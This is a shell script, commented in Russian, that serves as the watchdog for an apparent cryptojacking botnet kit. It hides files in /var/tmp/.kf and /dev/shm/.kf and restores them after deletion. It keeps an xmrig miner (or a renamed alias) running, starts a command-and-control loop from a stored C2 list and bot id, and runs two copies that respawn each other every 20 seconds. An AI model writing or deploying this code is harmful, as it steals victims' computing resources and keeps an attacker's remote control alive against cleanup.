#!/bin/sh
# wd.sh — совместимый дополнительный сторож текущего fleet-кита.
# Использует то же D/S, c2list, id и .alias, что fleet-agent/guardian.
D="${KF_D:-/var/tmp/.kf}"
S="${KF_S:-/dev/shm/.kf}"
R="${1:-m}"

alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
detach(){ if command -v setsid >/dev/null 2>&1; then setsid "$@" </dev/null >/dev/null 2>&1 & elif command -v nohup >/dev/null 2>&1; then nohup "$@" </dev/null >/dev/null 2>&1 & else "$@" </dev/null >/dev/null 2>&1 & fi; }
bin(){ a=$(cat "$D/.alias" 2>/dev/null); [ -n "$a" ] && [ -x "$a" ] && { printf '%s' "$a"; return; }; [ -x "$D/xmrig" ] && printf '%s' "$D/xmrig"; }

for p in /proc/[0-9]*; do
  pid=${p#/proc/}; [ "$pid" = "$$" ] && continue
  c=$(tr '\0' ' ' <"$p/cmdline" 2>/dev/null)
  case "$c" in *"$D/wd.sh $R"*) exit 0;; esac
done

restore(){
  [ -d "$D" ] || mkdir -p "$D" 2>/dev/null
  [ -d "$S" ] || return 0
  for f in "$S"/* "$S"/.[!.]*; do
    [ -e "$f" ] || continue
    b=${f##*/}
    case "$b" in xm.log|xm.log.*|.gpid|.agent.lock|.upd*) continue;; esac
    [ -e "$D/$b" ] || cp -f "$f" "$D/$b" 2>/dev/null
  done
}

case "$R" in
m|g)
  while :; do
    restore
    B=$(bin)
    if [ -n "$B" ] && [ -s "$D/c.json" ] && ! alm "$B -c"; then
      detach nice -n 19 "$B" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null)
    fi
    alm "$D/loop.sh" || { C2=$(cat "$D/c2list" 2>/dev/null); [ -n "$C2" ] && detach sh "$D/loop.sh" "$(cat "$D/id" 2>/dev/null)" $C2; }
    other=m; [ "$R" = m ] && other=g
    alm "$D/wd.sh $other" || detach sh "$D/wd.sh" "$other"
    sleep 20
  done ;;
*) echo "usage: $0 m|g" >&2; exit 2;;
esac
